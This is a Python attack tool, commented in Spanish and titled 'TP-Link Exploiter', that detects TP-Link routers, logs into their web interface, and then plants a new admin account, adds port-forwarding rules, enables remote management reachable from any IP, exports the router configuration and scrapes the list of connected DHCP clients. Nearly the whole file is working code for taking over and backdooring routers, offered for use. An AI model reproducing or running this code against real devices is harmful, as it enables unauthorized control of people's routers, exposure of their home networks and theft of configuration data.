#!/usr/bin/env python3
"""
TP-Link Exploiter - Explotador Específico para TP-Link
Implementa funcionalidades reales para routers y dispositivos TP-Link
"""

import requests
import re
import json
import time
import base64
import hashlib
import urllib.parse
from typing import Dict, List, Any, Optional, Tuple
import logging

class TPLinkExploiter:
    """Explotador específico para dispositivos TP-Link"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.logger = logging.getLogger('TPLinkExploiter')
        
        # URLs específicas de TP-Link
        self.tplink_urls = {
            'login': '/userRpm/LoginRpm.htm',
            'status': '/userRpm/StatusRpm.htm',
            'wan_settings': '/userRpm/WanDynamicIpCfgRpm.htm',
            'port_forwarding': '/userRpm/VirtualServerRpm.htm',
            'users': '/userRpm/UserRpm.htm',
            'system_tools': '/userRpm/SystemToolsRpm.htm',
            'reboot': '/userRpm/SysRebootRpm.htm',
            'backup': '/userRpm/ConfigManipulationRpm.htm'
        }
        
        # Patrones de detección de TP-Link
        self.tplink_patterns = {
            'title': r'<title>.*?TP-LINK.*?</title>',
            'model': r'TP-LINK\s+([A-Z0-9\-]+)',
            'firmware': r'Firmware Version:\s*([0-9\.]+)',
            'mac': r'MAC Address:\s*([0-9A-Fa-f:]{17})'
        }
    
    def detect_tplink_device(self, host: str, port: int = 80) -> Dict[str, Any]:
        """Detecta si es un dispositivo TP-Link y obtiene información"""
        try:
            url = f"http://{host}:{port}"
            response = self.session.get(url, timeout=10, verify=False)
            
            if response.status_code == 200:
                content = response.text
                
                # Verificar si es TP-Link
                if 'TP-LINK' in content.upper() or 'tplink' in content.lower():
                    device_info = {
                        'is_tplink': True,
                        'host': host,
                        'port': port,
                        'title': self._extract_title(content),
                        'model': self._extract_model(content),
                        'firmware': self._extract_firmware(content),
                        'mac': self._extract_mac(content),
                        'login_url': self._extract_login_url(content, host, port)
                    }
                    
                    self.logger.info(f"Dispositivo TP-Link detectado: {device_info['model']}")
                    return device_info
            
            return {'is_tplink': False, 'host': host, 'port': port}
            
        except Exception as e:
            self.logger.error(f"Error detectando dispositivo TP-Link: {e}")
            return {'is_tplink': False, 'host': host, 'port': port, 'error': str(e)}
    
    def _extract_title(self, content: str) -> str:
        """Extrae el título de la página"""
        match = re.search(self.tplink_patterns['title'], content, re.IGNORECASE)
        return match.group(0) if match else "TP-Link Device"
    
    def _extract_model(self, content: str) -> str:
        """Extrae el modelo del dispositivo"""
        match = re.search(self.tplink_patterns['model'], content, re.IGNORECASE)
        return match.group(1) if match else "Unknown"
    
    def _extract_firmware(self, content: str) -> str:
        """Extrae la versión del firmware"""
        match = re.search(self.tplink_patterns['firmware'], content, re.IGNORECASE)
        return match.group(1) if match else "Unknown"
    
    def _extract_mac(self, content: str) -> str:
        """Extrae la dirección MAC"""
        match = re.search(self.tplink_patterns['mac'], content, re.IGNORECASE)
        return match.group(1) if match else "Unknown"
    
    def _extract_login_url(self, content: str, host: str, port: int) -> str:
        """Extrae la URL de login"""
        # Buscar formulario de login
        login_patterns = [
            r'action="([^"]*login[^"]*)"',
            r'action="([^"]*Login[^"]*)"',
            r'href="([^"]*login[^"]*)"',
            r'href="([^"]*Login[^"]*)"'
        ]
        
        for pattern in login_patterns:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                login_path = match.group(1)
                if not login_path.startswith('http'):
                    login_path = f"http://{host}:{port}{login_path}"
                return login_path
        
        # URL por defecto
        return f"http://{host}:{port}/userRpm/LoginRpm.htm"
    
    def login_tplink(self, host: str, port: int, username: str, password: str) -> bool:
        """Realiza login en dispositivo TP-Link"""
        try:
            # Obtener página de login
            login_url = f"http://{host}:{port}/userRpm/LoginRpm.htm"
            response = self.session.get(login_url, timeout=10, verify=False)
            
            if response.status_code != 200:
                return False
            
            # Extraer parámetros necesarios para el login
            login_params = self._extract_login_params(response.text)
            
            # Preparar datos de login
            login_data = {
                'username': username,
                'password': password,
                'login': 'Login'
            }
            
            # Añadir parámetros adicionales si existen
            login_data.update(login_params)
            
            # Realizar login
            login_response = self.session.post(login_url, data=login_data, timeout=10, verify=False)
            
            # Verificar si el login fue exitoso
            if login_response.status_code == 200:
                # Verificar si estamos en la página principal
                if 'StatusRpm.htm' in login_response.text or 'MainRpm.htm' in login_response.text:
                    self.logger.info(f"Login exitoso en {host}:{port} con {username}")
                    return True
            
            return False
            
        except Exception as e:
            self.logger.error(f"Error en login TP-Link: {e}")
            return False
    
    def _extract_login_params(self, content: str) -> Dict[str, str]:
        """Extrae parámetros adicionales necesarios para el login"""
        params = {}
        
        # Buscar campos hidden
        hidden_pattern = r'<input[^>]*type="hidden"[^>]*name="([^"]*)"[^>]*value="([^"]*)"'
        matches = re.findall(hidden_pattern, content, re.IGNORECASE)
        
        for name, value in matches:
            params[name] = value
        
        return params
    
    def add_port_forward_rule(self, host: str, port: int, external_port: int, internal_ip: str, internal_port: int, protocol: str = 'TCP') -> bool:
        """Añade regla de port forwarding real en TP-Link"""
        try:
            # URL de port forwarding
            pf_url = f"http://{host}:{port}/userRpm/VirtualServerRpm.htm"
            
            # Obtener página actual
            response = self.session.get(pf_url, timeout=10, verify=False)
            if response.status_code != 200:
                return False
            
            # Extraer parámetros necesarios
            pf_params = self._extract_port_forward_params(response.text)
            
            # Preparar datos para nueva regla
            pf_data = {
                'serviceType': 'User Defined',
                'externalPort': str(external_port),
                'internalPort': str(internal_port),
                'internalIP': internal_ip,
                'protocol': protocol.upper(),
                'status': 'Enabled',
                'Save': 'Save'
            }
            
            # Añadir parámetros adicionales
            pf_data.update(pf_params)
            
            # Enviar regla
            pf_response = self.session.post(pf_url, data=pf_data, timeout=10, verify=False)
            
            if pf_response.status_code == 200:
                self.logger.info(f"Regla de port forwarding añadida: {external_port} -> {internal_ip}:{internal_port}")
                return True
            
            return False
            
        except Exception as e:
            self.logger.error(f"Error añadiendo port forwarding: {e}")
            return False
    
    def _extract_port_forward_params(self, content: str) -> Dict[str, str]:
        """Extrae parámetros necesarios para port forwarding"""
        params = {}
        
        # Buscar campos hidden
        hidden_pattern = r'<input[^>]*type="hidden"[^>]*name="([^"]*)"[^>]*value="([^"]*)"'
        matches = re.findall(hidden_pattern, content, re.IGNORECASE)
        
        for name, value in matches:
            params[name] = value
        
        return params
    
    def create_admin_user(self, host: str, port: int, username: str, password: str) -> bool:
        """Crea usuario administrador real en TP-Link"""
        try:
            # URL de gestión de usuarios
            users_url = f"http://{host}:{port}/userRpm/UserRpm.htm"
            
            # Obtener página actual
            response = self.session.get(users_url, timeout=10, verify=False)
            if response.status_code != 200:
                return False
            
            # Extraer parámetros necesarios
            user_params = self._extract_user_params(response.text)
            
            # Preparar datos para nuevo usuario
            user_data = {
                'userName': username,
                'password': password,
                'confirmPassword': password,
                'userLevel': 'admin',
                'status': 'Enabled',
                'Save': 'Save'
            }
            
            # Añadir parámetros adicionales
            user_data.update(user_params)
            
            # Crear usuario
            user_response = self.session.post(users_url, data=user_data, timeout=10, verify=False)
            
            if user_response.status_code == 200:
                self.logger.info(f"Usuario administrador creado: {username}")
                return True
            
            return False
            
        except Exception as e:
            self.logger.error(f"Error creando usuario administrador: {e}")
            return False
    
    def _extract_user_params(self, content: str) -> Dict[str, str]:
        """Extrae parámetros necesarios para gestión de usuarios"""
        params = {}
        
        # Buscar campos hidden
        hidden_pattern = r'<input[^>]*type="hidden"[^>]*name="([^"]*)"[^>]*value="([^"]*)"'
        matches = re.findall(hidden_pattern, content, re.IGNORECASE)
        
        for name, value in matches:
            params[name] = value
        
        return params
    
    def enable_remote_management(self, host: str, port: int, remote_port: int = 8080) -> bool:
        """Habilita gestión remota en TP-Link"""
        try:
            # URL de configuración de sistema
            system_url = f"http://{host}:{port}/userRpm/SystemToolsRpm.htm"
            
            # Obtener página actual
            response = self.session.get(system_url, timeout=10, verify=False)
            if response.status_code != 200:
                return False
            
            # Extraer parámetros necesarios
            system_params = self._extract_system_params(response.text)
            
            # Preparar datos para habilitar gestión remota
            system_data = {
                'remoteManagement': 'Enabled',
                'remotePort': str(remote_port),
                'remoteIP': '0.0.0.0',  # Permitir desde cualquier IP
                'Save': 'Save'
            }
            
            # Añadir parámetros adicionales
            system_data.update(system_params)
            
            # Habilitar gestión remota
            system_response = self.session.post(system_url, data=system_data, timeout=10, verify=False)
            
            if system_response.status_code == 200:
                self.logger.info(f"Gestión remota habilitada en puerto {remote_port}")
                return True
            
            return False
            
        except Exception as e:
            self.logger.error(f"Error habilitando gestión remota: {e}")
            return False
    
    def _extract_system_params(self, content: str) -> Dict[str, str]:
        """Extrae parámetros necesarios para configuración de sistema"""
        params = {}
        
        # Buscar campos hidden
        hidden_pattern = r'<input[^>]*type="hidden"[^>]*name="([^"]*)"[^>]*value="([^"]*)"'
        matches = re.findall(hidden_pattern, content, re.IGNORECASE)
        
        for name, value in matches:
            params[name] = value
        
        return params
    
    def backup_configuration(self, host: str, port: int, backup_file: str) -> bool:
        """Realiza backup de la configuración del router"""
        try:
            # URL de backup
            backup_url = f"http://{host}:{port}/userRpm/ConfigManipulationRpm.htm"
            
            # Obtener página actual
            response = self.session.get(backup_url, timeout=10, verify=False)
            if response.status_code != 200:
                return False
            
            # Extraer parámetros necesarios
            backup_params = self._extract_backup_params(response.text)
            
            # Preparar datos para backup
            backup_data = {
                'action': 'Export',
                'Save': 'Export'
            }
            
            # Añadir parámetros adicionales
            backup_data.update(backup_params)
            
            # Realizar backup
            backup_response = self.session.post(backup_url, data=backup_data, timeout=30, verify=False)
            
            if backup_response.status_code == 200:
                # Guardar configuración
                with open(backup_file, 'wb') as f:
                    f.write(backup_response.content)
                
                self.logger.info(f"Backup guardado en {backup_file}")
                return True
            
            return False
            
        except Exception as e:
            self.logger.error(f"Error realizando backup: {e}")
            return False
    
    def _extract_backup_params(self, content: str) -> Dict[str, str]:
        """Extrae parámetros necesarios para backup"""
        params = {}
        
        # Buscar campos hidden
        hidden_pattern = r'<input[^>]*type="hidden"[^>]*name="([^"]*)"[^>]*value="([^"]*)"'
        matches = re.findall(hidden_pattern, content, re.IGNORECASE)
        
        for name, value in matches:
            params[name] = value
        
        return params
    
    def get_device_info(self, host: str, port: int) -> Dict[str, Any]:
        """Obtiene información detallada del dispositivo"""
        try:
            # URL de estado
            status_url = f"http://{host}:{port}/userRpm/StatusRpm.htm"
            
            response = self.session.get(status_url, timeout=10, verify=False)
            if response.status_code != 200:
                return {}
            
            content = response.text
            
            # Extraer información del dispositivo
            device_info = {
                'model': self._extract_model(content),
                'firmware': self._extract_firmware(content),
                'mac': self._extract_mac(content),
                'uptime': self._extract_uptime(content),
                'wan_ip': self._extract_wan_ip(content),
                'lan_ip': self._extract_lan_ip(content),
                'dhcp_clients': self._extract_dhcp_clients(content)
            }
            
            return device_info
            
        except Exception as e:
            self.logger.error(f"Error obteniendo información del dispositivo: {e}")
            return {}
    
    def _extract_uptime(self, content: str) -> str:
        """Extrae el tiempo de funcionamiento"""
        uptime_pattern = r'Uptime:\s*([^<]+)'
        match = re.search(uptime_pattern, content, re.IGNORECASE)
        return match.group(1).strip() if match else "Unknown"
    
    def _extract_wan_ip(self, content: str) -> str:
        """Extrae la IP WAN"""
        wan_ip_pattern = r'WAN IP Address:\s*([0-9\.]+)'
        match = re.search(wan_ip_pattern, content, re.IGNORECASE)
        return match.group(1) if match else "Unknown"
    
    def _extract_lan_ip(self, content: str) -> str:
        """Extrae la IP LAN"""
        lan_ip_pattern = r'LAN IP Address:\s*([0-9\.]+)'
        match = re.search(lan_ip_pattern, content, re.IGNORECASE)
        return match.group(1) if match else "Unknown"
    
    def _extract_dhcp_clients(self, content: str) -> List[Dict[str, str]]:
        """Extrae clientes DHCP"""
        clients = []
        
        # Buscar tabla de clientes DHCP
        dhcp_pattern = r'<tr[^>]*>.*?<td[^>]*>([^<]+)</td>.*?<td[^>]*>([^<]+)</td>.*?<td[^>]*>([^<]+)</td>.*?</tr>'
        matches = re.findall(dhcp_pattern, content, re.IGNORECASE | re.DOTALL)
        
        for match in matches:
            if len(match) >= 3:
                clients.append({
                    'ip': match[0].strip(),
                    'mac': match[1].strip(),
                    'hostname': match[2].strip()
                })
        
        return clients